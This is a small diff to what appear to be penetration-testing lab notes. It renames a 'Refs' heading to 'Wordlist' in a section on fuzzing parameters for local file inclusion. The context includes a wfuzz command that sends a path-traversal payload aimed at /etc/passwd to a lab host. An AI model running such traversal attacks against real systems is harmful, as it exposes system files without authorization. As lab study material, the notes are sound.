@@ -188,7 +188,7 @@ A quick breakdown of the above command:
 
 `http://10.10.10.167/admin.php` Lastly, the target URL.
 ### Fuzzing Parameter for LFI
-Refs:
+Wordlist:
 * <https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt>
 ```
 wfuzz -b 'PHPSESSID=asli2tadgik6dr33077orjr7oh' --hw 100 -c -w ~/Downloads/burp-parameter-names.txt http://10.10.10.109/manage.php?FUZZ=../../../../../../../../../../../../etc/passwd
